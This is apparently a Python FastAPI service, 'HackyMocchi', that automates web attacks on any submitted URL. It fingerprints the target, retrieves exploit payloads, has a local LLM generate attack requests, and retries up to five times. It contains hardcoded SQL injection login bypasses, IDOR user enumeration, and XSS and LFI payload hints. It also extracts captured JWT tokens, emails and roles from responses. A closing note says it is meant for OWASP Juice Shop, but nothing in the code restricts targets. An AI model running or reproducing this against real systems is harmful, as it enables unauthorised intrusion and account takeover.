import os
import sys
import asyncio
import json
import socket
import re
import requests
import urllib3
from typing import AsyncGenerator
from urllib.parse import urlparse
from langchain_community.document_compressors.flashrank_rerank import FlashrankRerank
from groq import Groq
from fastapi import FastAPI
from fastapi.responses import FileResponse, StreamingResponse
from pydantic import BaseModel
from langchain_huggingface import HuggingFaceEmbeddings
from langchain_chroma import Chroma


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DB_PATH = os.path.join(BASE_DIR, "hackymocchi", "chroma_data")
COLLECTION_KNOWLEDGE = "vuln_knowledge"
COLLECTION_PAYLOADS = "hacking_payloads"

app = FastAPI(title="HackyMocchi API")

class SecuritySearchEngine:
    def __init__(self, db_path):
        print("[*] 초고속 보안 검색 엔진 초기화 (Groq + Flashrank)...")
        self.embeddings = HuggingFaceEmbeddings(model_name="sentence-transformers/all-MiniLM-L6-v2")
        
        # DB 경로가 올바른지 확인
        self.vs_payloads = Chroma(collection_name="hacking_payloads", persist_directory=db_path, embedding_function=self.embeddings)
        self.vs_vuln = Chroma(collection_name="vuln_knowledge", persist_directory=db_path, embedding_function=self.embeddings)
        
        # Reranker 로드
        self.compressor = FlashrankRerank(model="ms-marco-TinyBERT-L-2-v2")
        
        # Groq 클라이언트 (API Key는 환경변수로 빼는 것이 좋지만, 일단 코드에 포함)
        self.client = Groq(api_key=os.environ.get("GROQ_API_KEY"))
        self.model_name = "llama-3.1-8b-instant"

    def get_best_docs(self, user_query: str, k_candidates: int = 10, top_n: int = 4):
        # 1. 쿼리 최적화 (Groq)
        prompt = (
            f"Extract technical keywords for searching a CVE/Exploit database from this query.\n"
            f"Query: {user_query}\n"
            f"Output ONLY 3-4 English keywords separated by spaces. No explanation."
        )
        try:
            response = self.client.chat.completions.create(
                messages=[{"role": "user", "content": prompt}],
                model=self.model_name,
                temperature=0.1,
                max_tokens=50
            )
            eng_query = response.choices[0].message.content.strip()
            print(f"    [Search] Optimized Query: {eng_query}")
        except Exception as e:
            print(f"    [!] Groq Error: {e}")
            eng_query = user_query

        # 2. 검색 (Retrieve)
        docs_payloads = self.vs_payloads.similarity_search(eng_query, k=k_candidates)
        docs_vuln = self.vs_vuln.similarity_search(eng_query, k=k_candidates)
        base_docs = docs_payloads + docs_vuln

        if not base_docs:
            return []

        # 3. 재순위화 (Rerank)
        try:
            compressed_docs = self.compressor.compress_documents(documents=base_docs, query=eng_query)
            return compressed_docs[:top_n]
        except Exception as e:
            print(f"    [!] Rerank Error: {e}")
            return base_docs[:top_n]

# 전역 엔진 변수 (Startup 때 로드됨)
search_engine = None

@app.on_event("startup")
async def startup_event():
    global search_engine
    # DB_PATH는 코드 상단에 정의된 변수 사용
    if os.path.exists(DB_PATH):
        search_engine = SecuritySearchEngine(DB_PATH)
    else:
        print(f"[!] Warning: DB Path not found at {DB_PATH}")



class AnalyzeRequest(BaseModel):
    target_url: str


@app.get("/")
async def index():
    return FileResponse(os.path.join(BASE_DIR, "index.html"))


@app.post("/api/analyze")
async def analyze(req: AnalyzeRequest):
    return StreamingResponse(
        run_pipeline(req.target_url),
        media_type="text/event-stream",
        headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"},
    )


# ── SSE helper ──────────────────────────────────────────────────────
def emit(event_type: str, data: dict) -> str:
    return f"event: {event_type}\ndata: {json.dumps(data, ensure_ascii=False)}\n\n"


# ── Pipeline ─────────────────────────────────────────────────────────
async def run_pipeline(target_url: str) -> AsyncGenerator[str, None]:
    steps = ["recon", "retrieve", "generate", "exploit", "report"]
    yield emit("pipeline_init", {"steps": steps})

    state: dict = {
        "target_url": target_url,
        "target_ip": "Unknown",
        "detected_tech": "Web Vulnerability",
        "server": "Unknown",
        "context": "",
        "final_payload": target_url,
        "is_success": False,
        "attempts": 0,
        "last_feedback": "None",
        "http_method": "GET",
        "post_data": {},
        "_doc_count": 0,
        "_explanation": "",
        "_status_code": None,
        "_indicators_found": [],
    }

    # ── Step 0: Recon ────────────────────────────────────────────────
    yield emit("step_update", {"index": 0, "status": "running"})
    try:
        result = await asyncio.to_thread(_recon, state)
        state.update(result)
    except Exception as e:
        state["last_feedback"] = str(e)
    yield emit("stage", {
        "stage": "recon_result",
        "data": {
            "ip": state["target_ip"],
            "server": state["server"],
            "tech": state["detected_tech"],
        },
    })
    yield emit("step_update", {"index": 0, "status": "complete"})

    # ── Step 1: Retrieve ─────────────────────────────────────────────
    yield emit("step_update", {"index": 1, "status": "running"})
    try:
        result = await asyncio.to_thread(_retrieve, state)
        state.update(result)
    except Exception as e:
        state["context"] = f"Retrieval failed: {e}. Using general techniques."
    yield emit("stage", {
        "stage": "retrieve_result",
        "data": {
            "doc_count": state["_doc_count"],
            "context_length": len(state["context"]),
        },
    })
    yield emit("step_update", {"index": 1, "status": "complete"})

    # ── Steps 2+3: Generate → Exploit loop (max 5 attempts) ──────────
    MAX_ATTEMPTS = 5
    while not state["is_success"] and state["attempts"] < MAX_ATTEMPTS:
        attempt_num = state["attempts"] + 1

        # Step 2: Generate (60초 타임아웃, 실패 시 규칙 기반 fallback)
        yield emit("step_update", {"index": 2, "status": "running"})
        try:
            result = await asyncio.wait_for(
                asyncio.to_thread(_generate, state),
                timeout=60,
            )
            state.update(result)
        except (asyncio.TimeoutError, Exception) as e:
            # LLM 실패 시 → 시도 횟수별 규칙 기반 웹 공격 페이로드 사용
            fallback = _rule_based_payload(state, attempt_num)
            state["final_payload"] = fallback["url"]
            state["http_method"] = fallback["method"]
            state["post_data"] = fallback["data"]
            state["_explanation"] = f"[Rule-based] {fallback['explanation']} (LLM: {type(e).__name__})"

        yield emit("stage", {
            "stage": "generate_result",
            "data": {
                "url": state["final_payload"],
                "method": state["http_method"],
                "post_data": state["post_data"],
                "explanation": state["_explanation"],
                "attempt": attempt_num,
            },
        })
        yield emit("step_update", {"index": 2, "status": "complete"})

        # Step 3: Exploit
        yield emit("step_update", {"index": 3, "status": "running"})
        try:
            result = await asyncio.to_thread(_exploit, state)
            state.update(result)
        except Exception as e:
            state["is_success"] = False
            state["attempts"] += 1
            state["last_feedback"] = str(e)

        yield emit("stage", {
            "stage": "exploit_result",
            "data": {
                "is_success": state["is_success"],
                "attempt": state["attempts"],
                "feedback": state["last_feedback"],
                "status_code": state["_status_code"],
                "indicators_found": state["_indicators_found"],
                "jwt_token": state.get("_jwt_token"),
                "captured_email": state.get("_captured_email"),
                "captured_role": state.get("_captured_role"),
                "attack_url": state.get("_attack_url", ""),
                "attack_method": state.get("_attack_method", ""),
                "attack_data": state.get("_attack_data", {}),
                "response_preview": state.get("_response_preview", ""),
                "target_url": target_url,
            },
        })
        yield emit("step_update", {"index": 3, "status": "complete"})

        if state["is_success"] or state["attempts"] >= MAX_ATTEMPTS:
            break

    # ── Step 4: Report ───────────────────────────────────────────────
    yield emit("step_update", {"index": 4, "status": "running"})
    report_text = _build_report(state)
    yield emit("stage", {
        "stage": "report_result",
        "data": {"report": report_text},
    })
    yield emit("step_update", {"index": 4, "status": "complete"})

    yield emit("done", {
        "is_success": state["is_success"],
        "attempts": state["attempts"],
        "target_url": target_url,
        "ip": state["target_ip"],
        "tech": state["detected_tech"],
    })


# ── Node functions (blocking, run via asyncio.to_thread) ─────────────

def _recon(state: dict) -> dict:
    url = state["target_url"]
    try:
        domain = urlparse(url).netloc.split(":")[0]
        ip = socket.gethostbyname(domain)
        response = requests.get(url, timeout=5, verify=False)
        server = response.headers.get("Server", "Unknown")
        x_powered = response.headers.get("X-Powered-By", "")
        tech = "General Web App"
        if "Apache" in server:
            tech = "Apache"
        elif "Nginx" in server:
            tech = "Nginx"
        elif "Express" in server or "Express" in x_powered:
            tech = "Node.js/Express"
        elif "IIS" in server:
            tech = "IIS"
        elif "Python" in server or "Werkzeug" in server:
            tech = "Python Web App"
        return {"target_ip": ip, "detected_tech": tech, "server": server, "attempts": 0}
    except Exception as e:
        return {
            "target_ip": "Unknown",
            "detected_tech": "Web Vulnerability",
            "server": f"Error: {str(e)[:60]}",
            "attempts": 0,
        }


def _retrieve(state: dict) -> dict:
    """Groq와 Flashrank를 이용한 고성능 검색 적용"""
    if search_engine is None:
        return {
            "context": _web_fallback_context(state["detected_tech"]) + "\n(Search Engine not loaded)",
            "_doc_count": 0
        }

    tech = state["detected_tech"]
    target_url = state["target_url"]
    
    # 검색 쿼리 구성 (기술 스택 + URL 구조 기반)
    query = f"{tech} web vulnerability exploits for {target_url}"
    
    try:
        # 엔진을 통해 최적의 문서 검색
        results = search_engine.get_best_docs(query)
        
        if not results:
             return {
                "context": _web_fallback_context(tech),
                "_doc_count": 0
            }

        # 검색 결과를 텍스트 Context로 변환
        context_parts = []
        for doc in results:
            # 문서 내용 정리 (줄바꿈 등)
            content = doc.page_content.replace("\n", " ").strip()
            score = doc.metadata.get("relevance_score", 0)
            context_parts.append(f"- [Rel:{score:.2f}] {content}")
            
        context_text = "\n".join(context_parts)
        
        return {
            "context": context_text,
            "_doc_count": len(results)
        }
        
    except Exception as e:
        print(f"    [!] Retrieval Failed: {e}")
        return {
            "context": _web_fallback_context(tech) + f"\n(Error: {str(e)})",
            "_doc_count": 0
        }

def _rule_based_payload(state: dict, attempt: int) -> dict:
    """LLM 실패 시 시도 횟수마다 다른 웹 공격 페이로드를 순환 적용."""
    base = state["target_url"].split("#")[0].rstrip("/")
    feedback = state.get("last_feedback", "")

    # 이전 피드백 기반 엔드포인트 조정
    if "404" in feedback:
        # 엔드포인트를 찾지 못했으면 다음 경로 시도
        pass

    attacks = [
        # 1. SQLi Auth Bypass — Juice Shop REST API
        {
            "url": f"{base}/rest/user/login",
            "method": "POST",
            "data": {"email": "' OR 1=1--", "password": "x"},
            "explanation": "SQLi Auth Bypass: /rest/user/login (OR 1=1)",
        },
        # 2. SQLi variant — 따옴표 방식 변형
        {
            "url": f"{base}/rest/user/login",
            "method": "POST",
            "data": {"email": "' OR '1'='1'--", "password": "anything"},
            "explanation": "SQLi Auth Bypass: /rest/user/login (OR '1'='1')",
        },
        # 3. /api/login 경로 시도
        {
            "url": f"{base}/api/login",
            "method": "POST",
            "data": {"email": "' OR 1=1--", "password": "x"},
            "explanation": "SQLi Auth Bypass: /api/login endpoint",
        },
        # 4. IDOR — 사용자 목록 조회
        {
            "url": f"{base}/api/Users/",
            "method": "GET",
            "data": {},
            "explanation": "IDOR: /api/Users/ enumerate users",
        },
        # 5. SQLi — 주석 방식 변형
        {
            "url": f"{base}/rest/user/login",
            "method": "POST",
            "data": {"email": "admin'--", "password": "x"},
            "explanation": "SQLi: admin account direct bypass",
        },
    ]

    idx = (attempt - 1) % len(attacks)
    return attacks[idx]


def _web_fallback_context(tech: str) -> str:
    """DB가 없거나 검색 실패 시 기본 웹해킹 페이로드 힌트."""
    return (
        "[Web Hacking Fallback Payloads]\n"
        "- SQL Injection login: email=' OR 1=1--, password=x\n"
        "- SQL Injection alt: email=' OR '1'='1'--, password=x\n"
        "- XSS: <script>alert(1)</script>\n"
        "- LFI: ../../etc/passwd\n"
        "- Common endpoints: /login, /rest/user/login, /api/login, /admin, /search\n"
        f"- Tech detected: {tech}"
    )


def _generate(state: dict) -> dict:
    from langchain_ollama import ChatOllama
    from langchain_core.prompts import ChatPromptTemplate
    from langchain_core.output_parsers import StrOutputParser

    llm = ChatOllama(model="llama3.1", num_predict=150, timeout=90)
    prompt = ChatPromptTemplate.from_template(
        """You are a web penetration tester. Reply ONLY with one JSON object, no extra text.

Target: {target_url}
Tech stack: {tech}
Previous attempt feedback: {feedback}

Web attack types to consider: SQLi, XSS, LFI, IDOR, Command Injection, Auth Bypass
Common web endpoints: /login, /rest/user/login, /api/login, /search, /admin, /register

Payloads & hints from knowledge base:
{context}

Choose the most promising attack. Output JSON:
{{"url":"full_url_with_path","method":"POST","data":{{"email":"payload","password":"x"}},"explanation":"attack type and reason"}}"""
    )

    chain = prompt | llm | StrOutputParser()
    response_text = chain.invoke({
        "target_url": state["target_url"],
        "tech": state["detected_tech"],
        "context": state["context"][:500],
        "feedback": state["last_feedback"],
    })

    json_match = re.search(r"\{.*\}", response_text, re.DOTALL)
    if not json_match:
        raise ValueError("No JSON in LLM response")

    payload_data = json.loads(json_match.group())
    return {
        "final_payload": payload_data.get("url", state["target_url"]),
        "http_method": payload_data.get("method", "GET"),
        "post_data": payload_data.get("data", {}),
        "_explanation": payload_data.get("explanation", ""),
        "attempts": state["attempts"],
    }


def _exploit(state: dict) -> dict:
    payload = state["final_payload"]
    method = state.get("http_method", "GET")
    post_data = state.get("post_data", {})

    success_indicators = [
        "token", "admin@juice-sh.op", "password", "root:x:0:0:",
        "uid=", "SQL syntax", "You have an error in your SQL",
        "acquisitions", "PackageType", "authentication", "role",
    ]

    try:
        if method == "POST":
            res = requests.post(
                payload,
                json=post_data,
                headers={"Content-Type": "application/json"},
                timeout=8,
                verify=False,
            )
        else:
            res = requests.get(payload, timeout=8, verify=False)

        status_code = res.status_code
        is_success = any(ind.lower() in res.text.lower() for ind in success_indicators)
        found = [ind for ind in success_indicators if ind.lower() in res.text.lower()] if is_success else []

        # JWT 토큰 및 응답 데이터 추출
        jwt_token = None
        captured_email = None
        captured_role = None
        response_preview = res.text[:400]
        try:
            resp_json = res.json()
            # Juice Shop 구조: authentication.token
            auth = resp_json.get("authentication", {})
            jwt_token = auth.get("token") or resp_json.get("token")
            captured_email = auth.get("umail") or resp_json.get("email")
            # 중첩 구조 탐색
            if isinstance(resp_json.get("data"), dict):
                data = resp_json["data"]
                jwt_token = jwt_token or data.get("token")
                captured_email = captured_email or data.get("email")
                captured_role = data.get("role")
        except Exception:
            pass

        if is_success:
            feedback = "Success indicators found!"
        elif status_code == 403:
            feedback = "WAF blocked. Try encoding."
        elif status_code == 404:
            feedback = "Endpoint not found."
        elif status_code == 500:
            feedback = "Server error - possible vulnerability!"
        elif status_code == 401:
            feedback = "Authentication required."
        elif status_code == 200:
            feedback = "Request successful but no exploit indicators found."
        else:
            feedback = f"Status {status_code}. No exploit indicators."

        return {
            "is_success": is_success,
            "attempts": state["attempts"] + 1,
            "last_feedback": feedback,
            "_status_code": status_code,
            "_indicators_found": found,
            "_jwt_token": jwt_token,
            "_captured_email": captured_email,
            "_captured_role": captured_role,
            "_response_preview": response_preview,
            "_attack_url": payload,
            "_attack_method": method,
            "_attack_data": post_data,
        }
    except Exception as e:
        return {
            "is_success": False,
            "attempts": state["attempts"] + 1,
            "last_feedback": f"Connection error: {str(e)[:80]}",
            "_status_code": None,
            "_indicators_found": [],
            "_jwt_token": None,
            "_captured_email": None,
            "_captured_role": None,
            "_response_preview": "",
            "_attack_url": payload,
            "_attack_method": method,
            "_attack_data": post_data,
        }


def _build_report(state: dict) -> str:
    status = "공격 성공 ✅" if state["is_success"] else "공격 실패 ❌"
    indicators = ", ".join(state["_indicators_found"]) if state["_indicators_found"] else "없음"
    post_data_str = json.dumps(state["post_data"], ensure_ascii=False) if state["post_data"] else "없음"

    return f"""## 테스트 결과 보고서

### 1. 테스트 개요
- **대상 URL**: {state['target_url']}
- **대상 IP**: {state['target_ip']}
- **서버**: {state['server']}
- **감지된 기술 스택**: {state['detected_tech']}
- **최종 결과**: {status}
- **총 시도 횟수**: {state['attempts']}회

### 2. 사용된 공격 기법
- **공격 타입**: SQL Injection / Web Vulnerability
- **HTTP 메소드**: {state.get('http_method', 'GET')}
- **최종 페이로드 URL**: `{state['final_payload']}`
- **POST 데이터**: `{post_data_str}`
- **발견된 성공 지표**: {indicators}

### 3. 결과 분석
{
    '취약점 발견: 입력값이 SQL 쿼리에 직접 삽입되는 SQL Injection 취약점이 존재합니다. 공격자가 인증 없이 관리자 권한을 탈취할 수 있습니다.'
    if state['is_success'] else
    '취약점 미발견: 현재 설정으로는 공격이 성공하지 않았습니다. 더 정교한 페이로드가 필요하거나 대상이 방어 기법을 적용하고 있을 수 있습니다.'
}

### 4. 권장 조치사항
1. **Prepared Statements** (매개변수화된 쿼리) 사용
2. **입력값 검증** 및 화이트리스트 기반 필터링
3. **WAF(Web Application Firewall)** 도입
4. **에러 메시지 숨김** - SQL 에러를 사용자에게 노출하지 않기
5. **최소 권한 원칙** - DB 계정에 최소한의 권한만 부여

---
*이 테스트는 교육용 취약 애플리케이션(OWASP Juice Shop 등)을 대상으로 수행되었습니다.*
*반드시 **허가된 시스템**에서만 테스트를 수행하십시오.*"""


if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)
